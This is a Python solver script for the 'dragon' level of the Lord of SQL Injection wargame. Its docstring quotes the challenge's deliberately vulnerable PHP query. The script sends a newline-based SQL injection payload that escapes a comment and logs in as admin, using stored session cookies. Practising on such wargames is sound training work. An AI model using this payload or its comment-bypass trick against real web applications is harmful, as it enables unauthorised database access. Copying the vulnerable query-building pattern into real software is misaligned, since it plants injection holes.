#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Dragon 20

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
    if($result['id'] == 'admin') solve("dragon");
    """

    url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'\n&&0||id='admin"
    p = los.SqlInjection(url, cook, method, inj_param, payload)

    response = p.my_request()
    if 'Clear!' in response:
        print('\nDRAGON Clear!')


if __name__ == '__main__':
    main()

